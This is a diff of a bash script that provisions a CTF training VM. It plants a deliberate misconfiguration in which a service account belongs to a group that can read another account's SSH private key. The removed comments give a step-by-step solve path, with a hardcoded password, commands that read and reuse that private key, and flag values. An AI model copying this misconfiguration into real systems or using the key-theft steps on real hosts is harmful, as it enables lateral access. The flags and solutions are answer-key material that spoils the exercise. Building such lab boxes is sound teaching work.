@@ -3,74 +3,14 @@
 # provision_horizontal_pe.sh — Machine A (horizontal privilege escalation)
 # CITS3006 CTF project — Meridian Robotics Dev Portal
 #
-# Run this ONCE, as root, directly on the real Machine A VM (not on your dev
-# machine, not in a container simulation) after the base OS is installed and
-# before the box ships to the shared CTF network. This is deliberately
-# OS-level (real users, real groups, real file permissions) rather than
-# another Flask/Python service, since horizontal PE only makes sense against
-# a real multi-user box.
+# Run ONCE, as root, directly on the real Machine A VM after the base OS is
+# installed and before the box ships. Deliberately OS-level (real users,
+# groups, permissions) rather than another Flask service.
 #
-# ---------------------------------------------------------------------------
-# THE VULNERABILITY (for the report / exploit map)
-# ---------------------------------------------------------------------------
-# An attacker who already has ops_svc's credentials — leaked via the web
-# IDOR, ticket MRB-7E42D9 ("Rotate ops_svc credentials before audit") —
-# can SSH in as ops_svc. From there they can reach a second, same-privilege
-# service account (`build`) because ops_svc is a leftover member of the
-# `deploy` group.
-#
-# In-universe justification: ticket MRB-1A2B3C ("Staging build pipeline
-# failing... permissions error writing to /srv/build") is jchen's very
-# first ticket, filed months before the game's "present". The lore is that
-# sysadmin temporarily added ops_svc to the `deploy` group while debugging
-# that Jenkins permissions issue, fixed the actual bug, and forgot to
-# revoke the group membership. `deploy` group members can read (but not
-# write) `build`'s SSH private key, which is exactly what should never be
-# group-readable.
-#
-# Both ops_svc and build are unprivileged service accounts with no sudo
-# rights — this is a lateral move to a different account at the SAME
-# privilege level, not an escalation to root. (Vertical PE is a separate
-# path — see provision_vertical_pe.sh, which must be run AFTER this script
-# and depends on `build` already existing.)
-#
-# ---------------------------------------------------------------------------
-# SAMPLE SOLUTION (intended solve path)
-# ---------------------------------------------------------------------------
-# 1. SSH to Machine A as ops_svc using the IDOR-leaked creds:
-#      ssh ops_svc@<machine-a-ip>        (password: N3twork_Ops_2026!)
-# 2. Notice the extra group membership:
-#      id ops_svc   ->   groups: ops_svc deploy
-# 3. Hunt for what `deploy` actually grants access to (the ticket already
-#    hinted /srv/build is where the build system lives):
-#      find /srv/build -group deploy 2>/dev/null
-#    -> turns up /srv/build/.ssh/id_ed25519, mode 640, owner build:deploy
-# 4. Read it (group-readable, so ops_svc can cat it despite not owning it):
-#      cat /srv/build/.ssh/id_ed25519 > /tmp/build_key
-#      chmod 600 /tmp/build_key
-# 5. Use it to log in as build directly:
-#      ssh -i /tmp/build_key build@<machine-a-ip>
-# 6. Read the flag:
-#      cat ~/flag_horizontal.txt
-#      -> FLAG{horizontal_ops_svc_group_perms_to_build}
-#
-# Not automatable by a generic scanner: it requires already holding
-# ops_svc's creds (only obtainable via the IDOR chain), noticing an
-# unexpected secondary group, and connecting that group to a specific
-# path the game only hinted at via an old, easy-to-skip ticket.
-#
-# ---------------------------------------------------------------------------
-# DECOYS / hardening notes
-# ---------------------------------------------------------------------------
-# - /srv/build also gets ordinary, boring Jenkins-looking files (build logs,
-#   a deploy.sh) so `ls /srv/build` alone doesn't scream "look in .ssh".
-# - build has NO sudo rights and is not in any privileged group — confirm
-#   this stays true if you touch the box later, or you'll accidentally turn
-#   this into a vertical PE path instead.
-# - build's foothold is also where vertical PE's own artifact lives
-#   (provision_vertical_pe.sh drops a backup archive under
-#   /srv/build/backups/ that build can already read) — don't run that
-#   script before this one.
+# Vuln: ops_svc (creds leaked via the web IDOR) is a leftover member of the
+# `deploy` group, which can read (not write) build's SSH private key.
+# Lateral move to a same-privilege account, not an escalation to root.
+# Full write-up: see the Exploit Report doc.
 #
 set -euo pipefail
 
@@ -91,9 +31,8 @@ getent group "${DEPLOY_GROUP}" >/dev/null || groupadd "${DEPLOY_GROUP}"
 
 echo "[*] Creating user ${BUILD_USER}"
 if ! id "${BUILD_USER}" &>/dev/null; then
-  # No -g here: Ubuntu's default useradd behavior auto-creates a private
-  # group named after the user. Passing "-g build" would instead require a
-  # group called "build" to already exist, which it doesn't.
+  # No -g: Ubuntu's useradd auto-creates a private group named after the
+  # user; "-g build" would instead require a group "build" to pre-exist.
   useradd -m -s /bin/bash "${BUILD_USER}"
 fi
 usermod -aG "${DEPLOY_GROUP}" "${BUILD_USER}"
@@ -103,8 +42,7 @@ if ! id "${OPS_USER}" &>/dev/null; then
   useradd -m -s /bin/bash "${OPS_USER}"
 fi
 echo "${OPS_USER}:${OPS_PASSWORD}" | chpasswd
-# The misconfig: ops_svc should NOT be in this group. This is the leftover
-# from the Jenkins-debugging story above — it's the entire vulnerability.
+# The misconfig, and the entire vulnerability: ops_svc should not be here.
 usermod -aG "${DEPLOY_GROUP}" "${OPS_USER}"
 
 echo "[*] Setting up ${SRV_BUILD}"
@@ -112,7 +50,7 @@ mkdir -p "${SRV_BUILD}"
 chown "${BUILD_USER}:${BUILD_USER}" "${SRV_BUILD}"
 chmod 755 "${SRV_BUILD}"
 
-# --- Decoys: boring, plausible build-system clutter ---
+# Decoys: boring, plausible build-system clutter.
 sudo -u "${BUILD_USER}" bash -c "cat > ${SRV_BUILD}/deploy.sh" <<'EOF'
 #!/usr/bin/env bash
 # Meridian Robotics — staging deploy script (Jenkins job #4471)
@@ -129,7 +67,7 @@ sudo -u "${BUILD_USER}" bash -c "cat > ${SRV_BUILD}/build.log" <<'EOF'
 [2026-07-02 10:02] Job #4472 SUCCESS (workaround: ops added to deploy group temporarily)
 EOF
 
-# --- The actual secret: build's SSH key, group-readable by mistake ---
+# The actual secret: build's SSH key, group-readable by mistake.
 sudo -u "${BUILD_USER}" mkdir -p "${SRV_BUILD}/.ssh"
 sudo -u "${BUILD_USER}" ssh-keygen -t ed25519 -N "" -C "build@meridian-robotics" \
   -f "${SRV_BUILD}/.ssh/id_ed25519" >/dev/null
@@ -149,7 +87,7 @@ chown "${BUILD_USER}:${BUILD_USER}" "${SRV_BUILD}/.ssh/id_ed25519.pub"
 chmod 644 "${SRV_BUILD}/.ssh/id_ed25519.pub"
 
 echo "[*] Planting the flag"
-echo "FLAG{horizontal_ops_svc_group_perms_to_build}" > "${BUILD_HOME}/flag_horizontal.txt"
+echo "FLAG{H0RiZ0n7aL_is_D0N3_nd_dUS73d}" > "${BUILD_HOME}/flag_horizontal.txt"
 chown "${BUILD_USER}:${BUILD_USER}" "${BUILD_HOME}/flag_horizontal.txt"
 chmod 600 "${BUILD_HOME}/flag_horizontal.txt"
 
@@ -162,12 +100,9 @@ cat <<EOF
 
 Done.
 
-Reminder before shipping this box:
-  - Confirm sshd allows password auth for ops_svc (PasswordAuthentication),
-    or switch that leg to a planted key if your image disables it globally.
-  - ops_svc password: ${OPS_PASSWORD}
-  - Verify neither ops_svc nor build has sudo rights: 'sudo -l -U ops_svc'
-    and 'sudo -l -U build' should both show "not allowed to run sudo".
-  - Next: run provision_vertical_pe.sh (depends on build/${SRV_BUILD}
-    already existing, which they now do).
+  - ops_svc password: ${OPS_PASSWORD} (confirm sshd allows password auth
+    for ops_svc, or plant a key instead if your image disables it globally)
+  - Verify neither ops_svc nor build has sudo: 'sudo -l -U ops_svc' /
+    'sudo -l -U build' should both show "not allowed to run sudo"
+  - Next: run provision_vertical_pe.sh
 EOF
